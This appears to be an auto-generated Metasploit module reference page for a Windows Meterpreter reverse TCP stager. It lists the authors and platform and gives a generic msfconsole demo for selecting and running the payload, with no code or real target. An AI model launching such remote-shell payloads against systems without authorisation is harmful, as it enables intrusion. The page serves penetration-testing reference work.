## Windows Meterpreter (skape/jt Injection), Reverse TCP Stager

Inject the meterpreter server DLL (staged). Connect back to 
the attacker


## Module Name
payload/windows/patchupmeterpreter/reverse_tcp

## Authors
* skape
* jt <jt@klake.org>
* hdm
* sf





## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/patchupmeterpreter/reverse_tcp
msf payload(reverse_tcp) > show targets
   ... a list of targets ...
msf payload(reverse_tcp) > set TARGET <target-id>
msf payload(reverse_tcp) > show options
   ... show and set options ...
msf payload(reverse_tcp) > run
```
    
    